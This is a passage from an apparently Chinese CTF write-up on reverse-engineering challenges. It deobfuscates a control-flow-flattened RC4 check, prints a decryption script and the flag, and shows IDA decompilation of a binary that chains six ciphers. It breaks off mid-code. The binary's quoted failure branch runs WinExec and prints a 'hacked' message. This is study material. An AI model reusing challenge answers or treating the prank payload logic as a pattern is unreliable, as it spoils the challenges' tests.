𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤبخ = -<span class="number">1288645142</span></span><br><span class="line">        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 = 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤبخ</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>手工去混淆:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">o = []</span><br><span class="line">s = <span class="string">&#x27;the_flag_is_not_here&#x27;</span></span><br><span class="line">b = [<span class="number">199</span>, <span class="number">191</span>, <span class="number">168</span>, <span class="number">72</span>, <span class="number">189</span>, <span class="number">125</span>, <span class="number">226</span>, <span class="number">235</span>, <span class="number">210</span>, <span class="number">126</span>, <span class="number">156</span>, <span class="number">247</span>, <span class="number">93</span>, <span class="number">137</span>, <span class="number">42</span>, <span class="number">138</span>, <span class="number">76</span>, <span class="number">23</span>, <span class="number">139</span>, <span class="number">151</span>, <span class="number">29</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">136</span>, <span class="number">143</span>, <span class="number">129</span>, <span class="number">0</span>, <span class="number">242</span>, <span class="number">73</span>, <span class="number">19</span>, <span class="number">236</span>, <span class="number">61</span>, <span class="number">235</span>, <span class="number">70</span>, <span class="number">18</span>, <span class="number">27</span>, <span class="number">250</span>, <span class="number">135</span>, <span class="number">60</span>, <span class="number">112</span>, <span class="number">48</span>]</span><br><span class="line">s = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>, <span class="built_in">list</span>(s)))</span><br><span class="line">a = <span class="string">&quot;123456789&quot;</span></span><br><span class="line">a = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>, <span class="built_in">list</span>(a)))</span><br><span class="line">length_flag = <span class="built_in">len</span>(a)</span><br><span class="line">d = -<span class="number">1479559293</span></span><br><span class="line">f = <span class="built_in">len</span>(s)</span><br><span class="line">g = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                                <span class="keyword">while</span> d == -<span class="number">2118257528</span>:</span><br><span class="line">                                    h = <span class="number">1939365939</span></span><br><span class="line">                                    <span class="keyword">if</span> i &lt; length_flag:</span><br><span class="line">                                        h = <span class="number">1644783123</span></span><br><span class="line">                                    d = h</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">if</span> d != -<span class="number">1889341384</span>:</span><br><span class="line">                                    <span class="keyword">break</span></span><br><span class="line">                                o[g] = g</span><br><span class="line">                                d = -<span class="number">798623831</span></span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> d != -<span class="number">1717721974</span>:</span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line">                            g = <span class="number">0</span></span><br><span class="line">                            p = <span class="number">0</span></span><br><span class="line">                            i = <span class="number">0</span></span><br><span class="line">                            d = -<span class="number">2118257528</span></span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> d != -<span class="number">1479559293</span>:</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        q = <span class="number">1698955189</span></span><br><span class="line">                        <span class="keyword">if</span> g &lt; <span class="number">256</span>:</span><br><span class="line">                            q = <span class="number">1974196793</span></span><br><span class="line">                        d = q</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> d != -<span class="number">1443714681</span>:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    p = <span class="number">0</span></span><br><span class="line">                    g = <span class="number">0</span></span><br><span class="line">                    d = <span class="number">2110390670</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> d != -<span class="number">1288645142</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                r = s[(g % f)] + o[g] + p</span><br><span class="line">                p = r &amp; (r ^ <span class="number">3840</span>)</span><br><span class="line">                o[g] = (o[p] &amp; <span class="number">235</span> | ~o[p] &amp; <span class="number">20</span>) ^ (o[g] &amp; <span class="number">235</span> | ~o[g] &amp; <span class="number">20</span>)</span><br><span class="line">                o[p] = ~o[g] &amp; o[p] | ~o[p] &amp; o[g]</span><br><span class="line">                o[g] = (o[p] &amp; <span class="number">212</span> | ~o[p] &amp; <span class="number">43</span>) ^ (o[g] &amp; <span class="number">212</span> | ~o[g] &amp; <span class="number">43</span>)</span><br><span class="line">                d = -<span class="number">367188513</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> d != -<span class="number">798623831</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            g += <span class="number">1</span></span><br><span class="line">            d = <span class="number">1405424855</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> d != -<span class="number">606860395</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        d = -<span class="number">2118257528</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d == -<span class="number">605967056</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> d == -<span class="number">586318370</span>:</span><br><span class="line">        d = -<span class="number">605967056</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Bad&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> d == -<span class="number">367188513</span>:</span><br><span class="line">        g += <span class="number">1</span></span><br><span class="line">        d = <span class="number">2110390670</span></span><br><span class="line">    <span class="keyword">if</span> d == <span class="number">833744747</span>:</span><br><span class="line">        g += <span class="number">1</span></span><br><span class="line">        d = -<span class="number">1479559293</span></span><br><span class="line">    <span class="keyword">if</span> d == <span class="number">1405424855</span>:</span><br><span class="line">        s = -<span class="number">1443714681</span></span><br><span class="line">        <span class="keyword">if</span> g &lt; <span class="number">256</span>:</span><br><span class="line">            s = -<span class="number">1889341384</span></span><br><span class="line">        d = s</span><br><span class="line">    <span class="keyword">if</span> d == <span class="number">1513289402</span>:</span><br><span class="line">        d = -<span class="number">605967056</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Good!&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> d == <span class="number">1644783123</span>:</span><br><span class="line">        g = g + <span class="number">1</span> &amp; <span class="number">255</span></span><br><span class="line">        p = o[g] + p &amp; <span class="number">255</span></span><br><span class="line">        o[g] = ~o[p] &amp; o[g] | o[p] &amp; ~o[g]</span><br><span class="line">        o[p] = (o[g] &amp; <span class="number">212</span> | ~o[g] &amp; <span class="number">43</span>) ^ (o[p] &amp; <span class="number">212</span> | ~o[p] &amp; <span class="number">43</span>)</span><br><span class="line">        o[g] = ~o[p] &amp; o[g] | o[p] &amp; ~o[g]</span><br><span class="line">        a[i] ^= o[(o[p] + o[g] &amp; <span class="number">255</span>)]</span><br><span class="line">        d = -<span class="number">606860395</span></span><br><span class="line">    <span class="keyword">if</span> d == <span class="number">1698955189</span>:</span><br><span class="line">        g = <span class="number">0</span></span><br><span class="line">        d = <span class="number">1405424855</span></span><br><span class="line">    <span class="keyword">if</span> d == <span class="number">1939365939</span>:</span><br><span class="line">        t = a == b</span><br><span class="line">        u = <span class="number">1513289402</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> t:</span><br><span class="line">            u = -<span class="number">586318370</span></span><br><span class="line">        d = u</span><br><span class="line">    <span class="keyword">if</span> d == <span class="number">1974196793</span>:</span><br><span class="line">        o.append(<span class="number">0</span>)</span><br><span class="line">        d = <span class="number">833744747</span></span><br><span class="line">    <span class="keyword">if</span> d == <span class="number">2110390670</span>:</span><br><span class="line">        w = -<span class="number">1717721974</span></span><br><span class="line">        <span class="keyword">if</span> g &lt; <span class="number">256</span>:</span><br><span class="line">            w = -<span class="number">1288645142</span></span><br><span class="line">        d = w</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>RC4加密, s_box可以直接导出, 最终解密脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b = [<span class="number">199</span>, <span class="number">191</span>, <span class="number">168</span>, <span class="number">72</span>, <span class="number">189</span>, <span class="number">125</span>, <span class="number">226</span>, <span class="number">235</span>, <span class="number">210</span>, <span class="number">126</span>, <span class="number">156</span>, <span class="number">247</span>, <span class="number">93</span>, <span class="number">137</span>, <span class="number">42</span>, <span class="number">138</span>, <span class="number">76</span>, <span class="number">23</span>, <span class="number">139</span>, <span class="number">151</span>, <span class="number">29</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">136</span>, <span class="number">143</span>, <span class="number">129</span>, <span class="number">0</span>, <span class="number">242</span>, <span class="number">73</span>, <span class="number">19</span>, <span class="number">236</span>, <span class="number">61</span>, <span class="number">235</span>, <span class="number">70</span>, <span class="number">18</span>, <span class="number">27</span>, <span class="number">250</span>, <span class="number">135</span>, <span class="number">60</span>, <span class="number">112</span>, <span class="number">48</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">output = [<span class="number">0</span> <span class="keyword">for</span>  i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(b))]</span><br><span class="line">s_box = [<span class="number">134</span>, <span class="number">202</span>, <span class="number">218</span>, <span class="number">39</span>, <span class="number">207</span>, <span class="number">28</span>, <span class="number">153</span>, <span class="number">156</span>, <span class="number">225</span>, <span class="number">18</span>, <span class="number">255</span>, <span class="number">199</span>, <span class="number">48</span>, <span class="number">186</span>, <span class="number">117</span>, <span class="number">189</span>, <span class="number">124</span>, <span class="number">72</span>, <span class="number">188</span>, <span class="number">255</span>, <span class="number">46</span>, <span class="number">120</span>, <span class="number">104</span>, <span class="number">184</span>, <span class="number">253</span>, <span class="number">237</span>, <span class="number">100</span>, <span class="number">173</span>, <span class="number">121</span>, <span class="number">117</span>, <span class="number">179</span>, <span class="number">94</span>, <span class="number">219</span>, <span class="number">40</span>, <span class="number">116</span>, <span class="number">110</span>, <span class="number">207</span>, <span class="number">182</span>, <span class="number">12</span>, <span class="number">30</span>, <span class="number">77</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(b)):</span><br><span class="line">    output[i] = s_box[i] ^ b[i]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, output))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag:Aurora{w3lc0m3_70_7h3_w0rld_0f_c0nfu510n}</p><h2 id="cryyyyyyypto"><a href="#cryyyyyyypto" class="headerlink" title="cryyyyyyypto"></a>cryyyyyyypto</h2><p>题目:<a href="https://raw.githubusercontent.com/Alikas0/CTF/master/challenges/2019/Aurora/cryyyyyyypto/cryyyyyypto.exe">cryyyyyyypto</a></p><p>根据字符串找到主要函数, 带了6个加密算法……..</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char *v3; // rdi</span><br><span class="line">  signed __int64 i; // rcx</span><br><span class="line">  char v6; // [rsp+0h] [rbp-30h]</span><br><span class="line">  char Str; // [rsp+40h] [rbp+10h]</span><br><span class="line">  __int64 *Dst; // [rsp+C8h] [rbp+98h]</span><br><span class="line">  void *Memory; // [rsp+E8h] [rbp+B8h]</span><br><span class="line">  unsigned __int64 j; // [rsp+108h] [rbp+D8h]</span><br><span class="line"></span><br><span class="line">  v3 = &amp;v6;</span><br><span class="line">  <span class="keyword">for</span> ( i = 122i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v3 = -<span class="number">858993460</span>;</span><br><span class="line">    v3 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  un_use((__int64)&amp;unk_7FF6D92E4002);</span><br><span class="line">  memset(&amp;Str, <span class="number">0</span>, 0x64ui64);</span><br><span class="line">  Dst = (__int64 *)malloc(0x100ui64);</span><br><span class="line">  Memory = malloc(0x100ui64);</span><br><span class="line">  printf(<span class="string">&quot;SEIN CHECK:&quot;</span>);</span><br><span class="line">  scanf(<span class="string">&quot;%s&quot;</span>, &amp;Str);</span><br><span class="line">  LODWORD(Size) = j_strlen(&amp;Str);</span><br><span class="line">  j_memset(Dst, <span class="number">0</span>, 0x100ui64);</span><br><span class="line">  j_memset(Memory, <span class="number">0</span>, 0x100ui64);</span><br><span class="line">  j_memcpy(Dst, &amp;Str, (unsigned <span class="built_in">int</span>)Size);</span><br><span class="line">  j_memcpy(Memory, aABoringCryptoM, 32ui64);</span><br><span class="line">  RC5((__int64)Dst, (__int64)Memory);</span><br><span class="line">  j_RC4((__int64)Dst, (__int64)Memory);</span><br><span class="line">  AES((__int64)Dst, (__int64)Memory);</span><br><span class="line">  RubyDES((__int64)Dst, (__int64)Memory);</span><br><span class="line">  TEA((__int64)Dst, (__int64)Memory);</span><br><span class="line">  blowfish((__int64)Dst, (__int64)Memory);</span><br><span class="line">  <span class="keyword">if</span> ( !j_memcmp(Dst, cmp_str, (unsigned <span class="built_in">int</span>)Size) )//判断函数</span><br><span class="line">  &#123;</span><br><span class="line">    printf(<span class="string">&quot;GOOD!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    CreateThread(0i64, 0i64, StartAddress, 0i64, <span class="number">0</span>, 0i64);</span><br><span class="line">    WinExec(CmdLine, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> ( j = 0i64; j &lt; <span class="number">0xBB8</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(<span class="string">&quot;NOPE!!! YOU HAVE BEEN HACKED BY DECADE!!!\n&quot;</span>);</span><br><span class="line">      Sleep(0x14u);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  free(Dst);</span><br><span class="line">  free(Memory);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  sub_7FF6D8931447((__int64)&amp;v6, (__int64)&amp;unk_7FF6D893F8F0);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="RC5"><a href="#RC5" class="headerlink" title="RC5"></a>RC5</h3><p>一开始没认出来, 人工逆向破解0.0…</p><h3 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">RC4</span><span class="params">(<span class="keyword">unsigned</span> __int8 *plaing, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 *v2; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// edx</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  _BYTE *cipher; <span class="comment">// [rsp+28h] [rbp+8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+84h] [rbp+64h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+154h] [rbp+134h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *flag; <span class="comment">// [rsp+180h] [rbp+160h]</span></span><br><span class="line">  __int64 key; <span class="comment">// [rsp+188h] [rbp+168h]</span></span><br><span class="line"></span><br><span class="line">  key = a2;</span><br><span class="line">  flag = plaing;</span><br><span class="line">  v2 = &amp;v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">90</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">-858993460</span>;</span><br><span class="line">    v2 = (__int64 *)((<span class="keyword">char</span> *)v2 + <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  un_use((__int64)&amp;unk_7FF6D92E4002);</span><br><span class="line">  init_Sbox(key);</span><br><span class="line">  cipher = <span class="built_in">malloc</span>((<span class="keyword">unsigned</span> <span class="keyword">int</span>)Size);</span><br><span class="line">  j_memset(cipher, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Size);</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Size; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = (v7 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    v8 = (S[v7] + v8) % <span class="number">256</span>;</span><br><span class="line">    S[v7] ^= S[v8];</span><br><span class="line">    S[v8] ^= S[v7];</span><br><span class="line">    S[v7] ^= S[v8];</span><br><span class="line">    v10 = flag[j];</span><br><span class="line">    v4 = (S[v8] + S[v7]) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    cipher[j] = S[(<span class="keyword">unsigned</span> __int8)(v4 + S[v8] + S[v7]) - (<span class="keyword">unsigned</span> __int8)v4] ^ v10;</span><br><span class="line">  &#125;</span><br><span class="line">  j_memcpy(flag, cipher, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Size);</span><br><span class="line">  <span class="built_in">free</span>(cipher);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>特征是init_Sbox()里:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> __fastcall <span class="title">sub_7FF6D89332B0</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 *v1; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">size_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// edx</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v9; <span class="comment">// [rsp+84h] [rbp+64h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+154h] [rbp+134h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *Str; <span class="comment">// [rsp+180h] [rbp+160h]</span></span><br><span class="line"></span><br><span class="line">  Str = a1;</span><br><span class="line">  v1 = &amp;v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">90</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v1 = <span class="number">0xCCCCCCCC</span>;</span><br><span class="line">    v1 = (__int64 *)((<span class="keyword">char</span> *)v1 + <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  un_use((__int64)&amp;unk_7FF6D92E4002);</span><br><span class="line">  j = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  result = j_strlen(Str);</span><br><span class="line">  v9 = result;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">256</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    S[j] = j;<span class="comment">//赋值位数</span></span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(j + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">256</span>; ++j )<span class="comment">//密钥扩展</span></span><br><span class="line">  &#123;</span><br><span class="line">    v10 = S[j] + v7;</span><br><span class="line">    v4 = ((<span class="keyword">unsigned</span> __int8)Str[j % v9] + v10) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    v7 = (<span class="keyword">unsigned</span> __int8)(v4 + Str[j % v9] + v10) - (<span class="keyword">unsigned</span> __int8)v4;</span><br><span class="line">    S[j] ^= S[v7];</span><br><span class="line">    S[v7] ^= S[j];</span><br><span class="line">    S[j] ^= S[v7];</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(j + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_7FF6D8931970</span><span class="params">(__int64 *a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 *v2; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+34h] [rbp+4h]</span></span><br><span class="line">  __int64 *input; <span class="comment">// [rsp+130h] [rbp+100h]</span></span><br><span class="line">  __int64 key; <span class="comment">// [rsp+138h] [rbp+108h]</span></span><br><span class="line"></span><br><span class="line">  key = a2;</span><br><span class="line">  input = a1;</span><br><span class="line">  v2 = &amp;v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">70</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">-858993460</span>;</span><br><span class="line">    v2 = (__int64 *)((<span class="keyword">char</span> *)v2 + <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  un_use((__int64)&amp;unk_7FF6D92E4002);</span><br><span class="line">  pad((__int64)input, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Size, <span class="number">16</span>i64);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Size / <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">if</span> ( j &gt;= (<span class="keyword">unsigned</span> <span class="keyword">int</span>)result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    AES(key, <span class="number">16u</span>, &amp;input[<span class="number">2</span> * j], &amp;input[<span class="number">2</span> * j], <span class="number">16u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进去AES:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_7FF6D8934210</span><span class="params">(<span class="keyword">void</span> *key, <span class="keyword">unsigned</span> <span class="keyword">int</span> num_16_1, __int64 *a3, __int64 *a4, <span class="keyword">unsigned</span> <span class="keyword">int</span> num_16)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+30h] [rbp+10h]</span></span><br><span class="line">  __int64 *v10; <span class="comment">// [rsp+1B8h] [rbp+198h]</span></span><br><span class="line">  <span class="keyword">char</span> *v11; <span class="comment">// [rsp+1D8h] [rbp+1B8h]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+1F8h] [rbp+1D8h]</span></span><br><span class="line">  <span class="keyword">char</span> Dst; <span class="comment">// [rsp+228h] [rbp+208h]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [rsp+258h] [rbp+238h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+284h] [rbp+264h]</span></span><br><span class="line">  <span class="keyword">int</span> k; <span class="comment">// [rsp+2A4h] [rbp+284h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *Src; <span class="comment">// [rsp+460h] [rbp+440h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> Size; <span class="comment">// [rsp+468h] [rbp+448h]</span></span><br><span class="line">  __int64 *input1; <span class="comment">// [rsp+470h] [rbp+450h]</span></span><br><span class="line">  __int64 *input2; <span class="comment">// [rsp+478h] [rbp+458h]</span></span><br><span class="line"></span><br><span class="line">  input2 = a4;</span><br><span class="line">  input1 = a3;</span><br><span class="line">  Size = num_16_1;</span><br><span class="line">  Src = key;</span><br><span class="line">  v5 = &amp;v8;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">274</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v5 = <span class="number">-858993460</span>;</span><br><span class="line">    v5 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  un_use((__int64)&amp;unk_7FF6D92E4002);</span><br><span class="line">  v10 = input2;</span><br><span class="line">  v11 = &amp;v9;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v12, <span class="number">0</span>, <span class="number">0x10</span>ui64);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0x10</span>ui64);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v14, <span class="number">0</span>, <span class="number">0x10</span>ui64);</span><br><span class="line">  j_memcpy(&amp;Dst, Src, Size);</span><br><span class="line">  sub_7FF6D8931244((__int64)&amp;Dst, <span class="number">16</span>i64, (__int64)&amp;v9);<span class="comment">//初始置换</span></span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; num_16; j += <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_7FF6D893129E((__int64)&amp;v14, (__int64)input1);</span><br><span class="line">    sub_7FF6D8931037((__int64)&amp;v14, (__int64)v11);</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">1</span>; k &lt; <span class="number">10</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 += <span class="number">16</span>;</span><br><span class="line">      sub_7FF6D8931456((__int64)&amp;v14);</span><br><span class="line">      sub_7FF6D89313B6((__int64)&amp;v14);</span><br><span class="line">      sub_7FF6D8931438(&amp;v14);</span><br><span class="line">      sub_7FF6D8931037((__int64)&amp;v14, (__int64)v11);</span><br><span class="line">    &#125;</span><br><span class="line">    sub_7FF6D8931456((__int64)&amp;v14);</span><br><span class="line">    sub_7FF6D89313B6((__int64)&amp;v14);</span><br><span class="line">    sub_7FF6D8931037((__int64)&amp;v14, (__int64)(v11 + <span class="number">16</span>));</span><br><span class="line">    sub_7FF6D8931460((__int64)&amp;v14, (__int64)v10);</span><br><span class="line">    v10 += <span class="number">2</span>;</span><br><span class="line">    input1 += <span class="number">2</span>;</span><br><span class="line">    v11 = &amp;v9;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_7FF6D8931447((__int64)&amp;v8, (__int64)&amp;unk_7FF6D893EEC8);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始置换:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_7FF6D89349E0</span><span class="params">(__int64 a1, __int64 a2, _DWORD *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 *v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  _DWORD *v7; <span class="comment">// [rsp+28h] [rbp+8h]</span></span><br><span class="line">  _DWORD *v8; <span class="comment">// [rsp+48h] [rbp+28h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">  <span class="keyword">int</span> k; <span class="comment">// [rsp+84h] [rbp+64h]</span></span><br><span class="line">  <span class="keyword">int</span> l; <span class="comment">// [rsp+A4h] [rbp+84h]</span></span><br><span class="line">  <span class="keyword">int</span> m; <span class="comment">// [rsp+C4h] [rbp+A4h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+1C0h] 